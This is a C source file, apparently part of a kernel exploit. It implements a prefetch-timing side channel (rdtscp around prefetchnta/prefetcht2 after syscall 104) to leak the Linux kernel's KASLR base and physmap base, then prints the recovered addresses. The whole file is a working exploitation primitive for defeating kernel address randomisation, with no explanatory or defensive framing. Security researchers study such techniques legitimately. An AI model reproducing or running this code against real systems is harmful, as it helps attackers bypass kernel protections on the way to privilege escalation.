#include "kaslr.h"
uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  asm volatile (".intel_syntax noprefix;"
    "mfence;"
    "rdtscp;"
    "mov %0, rax;"
    "mov %1, rdx;"
    "xor rax, rax;"
    "lfence;"
    "prefetchnta qword ptr [%4];"
    "prefetcht2 qword ptr [%4];"
    "xor rax, rax;"
    "lfence;"
    "rdtscp;"
    "mov %2, rax;"
    "mov %3, rdx;"
    "mfence;"
    ".att_syntax;"
    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
    : "r" (addr)
    : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}


uint64_t leak_phy(void) 
{
    uint64_t data[ARR_SIZE_PHYS] = {0};
    uint64_t min = ~0, addr = ~0;
    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < ARR_SIZE_PHYS; idx++) 
        {
            uint64_t test = SCAN_START_PHYS + idx * STEP_PHYS;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }
    for (int i = 0; i < ARR_SIZE_PHYS; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START_PHYS + i * STEP_PHYS;
        }
    }
    return addr;
}
uint64_t leak_syscall_entry(void) 
{
    uint64_t data[ARR_SIZE] = {0};
    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < ARR_SIZE; idx++) 
        {
            uint64_t test = SCAN_START + idx * STEP;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (int i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START + i * STEP;
        }
        // printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
    }

    return addr;
}

size_t leakKASLR(size_t offset){
    size_t val = leak_syscall_entry() - entry_SYSCALL_64_offset+offset;
    printf ("KASLR  base %llx\n", val);
    return val;
}

size_t leakPHY(size_t offset){
    size_t val =  leak_phy() - 0x100000000+offset;
    printf ("PHAMAP base %llx\n",val);
    return val;
}

